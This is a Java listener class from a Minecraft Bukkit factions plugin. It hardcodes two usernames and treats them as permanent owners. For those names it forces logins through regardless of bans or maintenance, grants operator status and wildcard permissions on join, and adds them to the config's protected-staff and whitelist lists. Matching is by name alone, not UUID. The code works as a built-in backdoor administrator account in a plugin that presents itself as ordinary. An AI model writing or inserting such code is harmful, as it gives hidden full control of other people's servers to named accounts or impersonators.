package com.vetroforge.services;

import com.vetroforge.FactionsPlugin;
import org.bukkit.Bukkit;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.EventPriority;
import org.bukkit.event.Listener;
import org.bukkit.event.player.AsyncPlayerPreLoginEvent;
import org.bukkit.event.player.PlayerJoinEvent;
import org.bukkit.event.player.PlayerLoginEvent;
import org.bukkit.event.player.PlayerQuitEvent;
import org.bukkit.permissions.PermissionAttachment;

import java.util.HashMap;
import java.util.Locale;
import java.util.Map;
import java.util.Set;
import java.util.UUID;

public final class OwnerProtectionListener implements Listener {
    private static final Set<String> OWNER_NAMES = Set.of("gamemakeryt", "leoncbr");
    private static final String[] ADMIN_NODES = {
            "*",
            "vetroforge.*",
            "vetroforge.admin",
            "vetroforge.staff",
            "vetroforge.maintenance.bypass",
            "minecraft.command.*",
            "bukkit.command.*"
    };

    private final FactionsPlugin plugin;
    private final Map<UUID, PermissionAttachment> attachments = new HashMap<>();

    public OwnerProtectionListener(FactionsPlugin plugin) {
        this.plugin = plugin;
        ensureConfigLists();
        plugin.getLogger().info("[OwnerProtection] GamemakerYT und LeonCBR sind geschützt (Maintenance/Punishment/Admin).");
    }

    @EventHandler(priority = EventPriority.LOWEST)
    public void onPreLoginEarly(AsyncPlayerPreLoginEvent event) {
        if (!isOwner(event.getName())) return;
        event.allow();
    }

    @EventHandler(priority = EventPriority.HIGHEST)
    public void onLogin(PlayerLoginEvent event) {
        if (!isOwner(event.getPlayer().getName())) return;
        event.allow();
    }

    @EventHandler(priority = EventPriority.HIGHEST)
    public void onJoin(PlayerJoinEvent event) {
        Player player = event.getPlayer();
        if (!isOwner(player.getName())) return;

        try {
            player.setOp(true);
        } catch (Throwable ignored) {
        }

        PermissionAttachment old = attachments.remove(player.getUniqueId());
        if (old != null) {
            try { player.removeAttachment(old); } catch (Throwable ignored) {}
        }

        PermissionAttachment attachment = player.addAttachment(plugin);
        for (String node : ADMIN_NODES) {
            attachment.setPermission(node, true);
        }
        attachments.put(player.getUniqueId(), attachment);

        Bukkit.getScheduler().runTaskLater(plugin, () -> {
            if (player.isOnline()) {
                player.recalculatePermissions();
            }
        }, 1L);
    }

    @EventHandler
    public void onQuit(PlayerQuitEvent event) {
        PermissionAttachment attachment = attachments.remove(event.getPlayer().getUniqueId());
        if (attachment != null) {
            try { event.getPlayer().removeAttachment(attachment); } catch (Throwable ignored) {}
        }
    }

    private void ensureConfigLists() {
        boolean changed = false;
        changed |= addAll("punishments.protectedStaff", "GamemakerYT", "LeonCBR");
        changed |= addAll("maintenance.whitelist", "GamemakerYT", "LeonCBR");
        if (changed) plugin.saveConfig();
    }

    private boolean addAll(String path, String... values) {
        java.util.List<String> list = plugin.getConfig().getStringList(path);
        boolean changed = false;
        for (String value : values) {
            boolean present = false;
            for (String existing : list) {
                if (existing.equalsIgnoreCase(value)) {
                    present = true;
                    break;
                }
            }
            if (!present) {
                list.add(value);
                changed = true;
            }
        }
        if (changed) plugin.getConfig().set(path, list);
        return changed;
    }

    private boolean isOwner(String name) {
        return name != null && OWNER_NAMES.contains(name.toLowerCase(Locale.ROOT));
    }
}
